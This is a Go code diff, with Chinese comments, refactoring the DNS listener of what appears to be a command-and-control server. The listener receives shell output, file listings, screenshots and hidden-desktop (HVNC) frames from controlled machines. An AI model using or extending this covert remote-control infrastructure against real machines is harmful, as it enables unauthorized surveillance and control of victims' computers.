@@ -10,7 +10,6 @@ import (
 	"BackendTemplate/pkg/utils"
 	"crypto/rand"
 	"encoding/base32"
-	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"net"
@@ -46,6 +45,10 @@ var (
 	metaInfoBuffers = make(map[string]dnsBufferEntry) // uid -> MetaInfo 注册分块
 	metaInfoLock    sync.Mutex
 )
+
+// XTerm/HVNC 会话广播函数，由 api 包在初始化时注入（nil 时 HandleClientReply 跳过）
+var BroadcastToXTermSessions func(uid string, data []byte)
+var BroadcastToHVNCSessions func(uid, sid string, frame []byte)
 
 // dnsBufferEntry DNS 分块缓冲条目（带最后更新时间，供过期清理）
 type dnsBufferEntry struct {
@@ -678,52 +681,17 @@ func handleResult(w dns.ResponseWriter, r *dns.Msg, m *dns.Msg, chunk, chunkInfo
 		w.WriteMsg(m)
 		return
 	}
-	if len(plain) < 4 {
+	// 客户端回包统一处理（四协议共用 pkg/command/reply_handlers.go，B4 收敛）：
+	// 随之补齐 DNS 原缺失的 XTerm/31 错误回包/HVNC 实时广播、文件编辑、监控帧、
+	// 下载与密钥轮换确认；DRIVES 补编码转换、SCREENSHOT1 补 data URI 前缀判定
+	replyType, resultData, err := command.SplitReplyPayload(plain)
+	if err != nil {
+		logx.Warnf("⚠️ [DNS] %v, UID: %s\n", err, uid)
 		w.WriteMsg(m)
 		return
 	}
-
-	replyType := binary.BigEndian.Uint32(plain[:4])
-	resultData := plain[4:]
-
-	// 处理结果（replyType 0 = 命令行输出 -> shell 内容）
-	switch replyType {
-	case 0:
-		var shell database.Shell
-		database.Engine.Where("uid = ?", uid).Get(&shell)
-		utf8Data, encodeErr := utils.ProcessShellOutput(resultData)
-		if encodeErr != nil {
-			utf8Data = resultData
-		}
-		database.AppendShellContent(uid, string(utf8Data)+"\n")
-	case command.PS:
-		utf8Data, encodeErr := utils.ProcessShellOutput(resultData)
-		if encodeErr != nil {
-			utf8Data = resultData
-		}
-		command.VarPidQueue.Add(uid, string(utf8Data))
-	case command.FileBrowse:
-		utf8Data, encodeErr := utils.ProcessShellOutput(resultData)
-		if encodeErr != nil {
-			utf8Data = resultData
-		}
-		command.VarFileBrowserQueue.Add(uid, string(utf8Data))
-	case command.DRIVES:
-		command.VarDrivesQueue.Add(uid, utils.GetExistingDrives(resultData))
-	case command.SCREENSHOT1:
-		command.VarScreenshotQueue.Add(uid, "data:image/png;base64,"+base64.StdEncoding.EncodeToString(resultData))
-	case command.HVNC_FRAME:
-		// HVNC 隐藏桌面帧 - [4B sidLen][sid][JPEG]；DNS 回传较小，可能被分片
-		sid, jpeg, ok := command.ParseHVNCFrame(resultData)
-		if ok {
-			command.VarHVNCFrameQueue.Add(uid, sid, jpeg)
-		}
-	case command.UPLOAD_ACK:
-		command.HandleUploadAck(uid, resultData)
-	case command.FILE_OP_RESULT:
-		command.HandleFileOpResult(uid, resultData)
-	default:
-		logx.Infof("📨 [DNS] 收到未处理结果类型 %d (uid=%s, len=%d)\n", replyType, uid, len(resultData))
+	if err := command.HandleClientReply("dns", uid, replyType, resultData, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
+		logx.Warnf("⚠️ [DNS] 处理回包失败 (type=%d): %v\n", replyType, err)
 	}
 
 	setTXTReply(m, r, "ok")
